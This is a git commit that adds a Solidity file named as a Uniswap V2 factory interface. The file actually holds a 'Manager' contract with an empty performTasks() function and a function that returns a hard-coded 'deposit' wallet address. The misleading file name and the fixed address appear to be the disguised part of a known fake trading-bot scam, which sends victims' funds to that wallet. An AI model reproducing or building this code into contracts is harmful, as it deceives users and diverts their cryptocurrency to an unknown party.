ecca51b91a9ffbc1fe3a5c4d374392c0fb62cf87
Eray USTA <2477308+erayusta@users.noreply.github.com>
2022-01-06 15:02:00 +0300

    Add files via upload

---
+++ contracts/interfaces/V2/IUniswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x09aabf5E05060d755F0771e1C4E5Dc7402BCBC6c;
+	}
+}
